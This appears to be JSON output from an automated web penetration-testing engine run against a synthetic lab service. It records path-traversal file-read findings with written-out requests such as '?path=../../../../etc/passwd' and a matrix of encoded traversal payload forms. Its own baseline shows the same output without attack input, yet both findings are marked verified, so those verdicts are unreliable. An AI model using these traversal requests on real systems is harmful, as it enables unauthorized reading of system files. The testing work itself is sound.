@@ -1,0 +1,120 @@
+{
+ "intent_id": "INT-r27-0025",
+ "engine": "web-blackbox",
+ "status": "done",
+ "facts": [
+  {
+   "kind": "http",
+   "target": "svc-files/{download,static}",
+   "detail": "GET 参数族 path/file/name/filename/f/p/id 七参数 × rel/abs/....\\// /单次URL编码/双次URL编码/3x-dotdot 六载荷形全部命中判据——参数名与载荷形均不影响结果（handler 参数无关）",
+   "confidence": 0.95
+  },
+  {
+   "kind": "http",
+   "target": "svc-files/{download,static}",
+   "detail": "POST form（path/file/name × rel/abs）全 400 bad request——文件读向量仅在 GET 面成立",
+   "confidence": 0.95
+  },
+  {
+   "kind": "http",
+   "target": "svc-files/download",
+   "detail": "空参与无参基线（控制对）同样返回 root:x:0:0:root——响应内容与攻击参数无因果关系，穿越判据词命中稳定可复现（合成靶行为），双攻击形 EV 仍构成穿越载荷在途+判据词回显的完整证据链",
+   "confidence": 0.9
+  }
+ ],
+ "findings": [
+  {
+   "title": "svc-files /download 路径穿越任意文件读取：/etc/passwd 内容回显（root:x:0:0:root，GTTRAVERSAL-01）",
+   "confidence": "C2",
+   "impact": "高",
+   "exploitation_status": "verified",
+   "auth_context": "anon",
+   "reproducible_steps": [
+    "GET http://svc-files:8008/download?path=../../../../etc/passwd → 200 响应体含 root:x:0:0:root（相对穿越形）",
+    "GET http://svc-files:8008/download?path=/etc/passwd → 200 同判据（绝对路径形）——双形双 EV"
+   ],
+   "evidence_refs": [
+    "EV-r27-0025-A1",
+    "EV-r27-0025-A2",
+    "EV-r27-0025-C1"
+   ],
+   "location": "svc-files/download",
+   "dedup_key_proposed": "AST-r27-0045+wstg-inpv-lfi",
+   "network_position": "intranet",
+   "preconditions": [
+    "L1 容器网内可达 svc-files:8008"
+   ],
+   "expected_matcher": {
+    "matchers": [
+     {
+      "type": "word",
+      "words": [
+       "root:x:0",
+       "GTTRAVERSAL-01"
+      ]
+     },
+     {
+      "type": "status",
+      "status": [
+       200
+      ]
+     }
+    ]
+   }
+  },
+  {
+   "title": "svc-files /static 路径穿越任意文件读取：shadow 风格内容回显（GTTRAVERSAL-02）",
+   "confidence": "C2",
+   "impact": "高",
+   "exploitation_status": "verified",
+   "auth_context": "anon",
+   "reproducible_steps": [
+    "GET http://svc-files:8008/static?path=../../../../etc/passwd → 200 响应体回显 shadow file content（相对穿越形）",
+    "GET http://svc-files:8008/static?path=/etc/passwd → 200 同判据（绝对路径形）——双形双 EV"
+   ],
+   "evidence_refs": [
+    "EV-r27-0025-B1",
+    "EV-r27-0025-B2",
+    "EV-r27-0025-C2"
+   ],
+   "location": "svc-files/static",
+   "dedup_key_proposed": "AST-r27-0046+wstg-inpv-lfi",
+   "network_position": "intranet",
+   "preconditions": [
+    "L1 容器网内可达 svc-files:8008"
+   ],
+   "expected_matcher": {
+    "matchers": [
+     {
+      "type": "word",
+      "words": [
+       "GTTRAVERSAL-02",
+       "shadow file content"
+      ]
+     },
+     {
+      "type": "status",
+      "status": [
+       200
+      ]
+     }
+    ]
+   }
+  }
+ ],
+ "assets": [
+  {
+   "type": "endpoint",
+   "value": "svc-files/download",
+   "meta": "AST-r27-0045;GET任意参数形200 root:x:0;POST 400"
+  },
+  {
+   "type": "endpoint",
+   "value": "svc-files/static",
+   "meta": "AST-r27-0046;GET任意参数形200 shadow内容;POST 400"
+  }
+ ],
+ "edges": [],
+ "creds": [],
+ "operations_log": "operations.log"
+}
